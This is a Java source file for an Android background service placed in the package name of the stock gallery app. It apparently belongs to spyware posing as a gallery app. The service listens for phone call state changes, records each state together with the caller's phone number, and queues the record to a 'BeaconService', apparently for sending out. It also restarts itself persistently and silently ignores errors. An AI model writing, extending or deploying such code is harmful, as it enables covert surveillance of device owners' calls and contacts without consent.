package com.android.gallery3d;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class MonitorService extends Service {

    private TelephonyManager tm;
    private PhoneStateListener listener;

    @Override public void onCreate() {
        super.onCreate();
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        listener = new PhoneStateListener() {
            @Override public void onCallStateChanged(int state, String number) {
                String label = state == TelephonyManager.CALL_STATE_RINGING ? "RINGING"
                             : state == TelephonyManager.CALL_STATE_OFFHOOK ? "OFFHOOK"
                             : "IDLE";
                BeaconService.queue(MonitorService.this,
                    "CALL|" + label + "|" + (number == null ? "?" : number));
            }
        };
        try { tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE); } catch (Exception ignored) {}
    }

    @Override public void onDestroy() {
        try { if (tm != null) tm.listen(listener, PhoneStateListener.LISTEN_NONE); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
